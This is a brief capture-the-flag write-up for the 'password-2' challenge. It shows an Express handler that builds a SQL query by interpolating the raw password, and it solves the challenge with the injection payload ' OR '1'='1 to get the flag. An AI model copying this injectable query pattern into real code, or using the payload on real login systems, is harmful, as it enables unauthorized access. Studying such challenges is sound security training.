# password-2
## Solved By: [Blenderwizard](https://github.com/Blenderwizard)
## Worth: 183 points
## Total Solves: 262
## Solution

The server is vulnurable to SQL injection. Output is not sanitized and used directly in the SQL Query.

`index.js`
``` javascript
app.post('/password', (req, res) => {
    const password = (req.body.password ?? '').toString()
    const result = db.prepare(
		// Password is not sanitized
        `SELECT password FROM passwords WHERE password='${password}';`
    ).get()
    if (result) res.json({ success: true, flag: FLAG })
    else res.json({ success: false })
})
```

Using this we can pass `' OR '1'='1` as a password, causing the database to execute `SELECT password FROM passwords WHERE password='' OR '1'='1';`. Result evaluates to true, and we recive the flag.